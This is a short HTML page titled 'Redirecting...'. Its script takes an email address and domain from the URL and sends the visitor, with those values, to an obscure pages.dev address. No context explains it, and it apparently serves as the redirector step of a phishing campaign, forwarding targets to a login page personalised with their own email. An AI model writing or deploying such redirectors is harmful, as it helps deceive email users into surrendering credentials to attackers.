<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script type="text/javascript">
        // Get all URL parameters from current page
        const params = new URLSearchParams(window.location.search);
        const mymail = params.get('mail') || '';
        const dm = params.get('domain') || '';

        // Build the redirect URL dynamically
        let redirectUrl = 'https://p38247974ts.pages.dev/';
        const queryParts = [];

        if (mymail) queryParts.push(`mail=${encodeURIComponent(mymail)}`);
        if (dm) queryParts.push(`domain=${encodeURIComponent(dm)}`);

        if (queryParts.length > 0) {
            redirectUrl += '?' + queryParts.join('&');
        }

        // Perform the redirect
        window.location.replace(redirectUrl);
    </script>
</body>
</html>
